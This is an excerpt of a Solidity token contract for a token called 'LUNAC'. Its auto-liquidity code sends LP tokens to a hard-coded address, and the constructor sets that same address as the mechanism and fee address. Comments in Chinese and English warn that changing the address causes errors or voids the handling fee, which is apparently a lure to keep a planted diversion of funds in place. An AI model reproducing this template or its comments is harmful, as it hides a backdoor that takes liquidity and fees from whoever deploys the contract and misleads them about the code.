        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {//=0xB821bb072f08A338962272923f9f4221B69094FC (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpFist, 0, 0, address(0xdDf8a1b824d6329A0f44FD5B73a7fbfB34E06E28), block.timestamp
                );
            }
        }
    }
...
contract tokens is AbsToken {
    constructor() AbsToken(
        ...
        "LUNAC",//Sy
        18,//De
        1000000,//Su 数量后面加20个0
        address(0xdDf8a1b824d6329A0f44FD5B73a7fbfB34E06E28),//The address controlled by the mechanism cannot be modified, and the handling fee will be voided after modification
        address(0xdDf8a1b824d6329A0f44FD5B73a7fbfB34E06E28)//
    ){
    }
}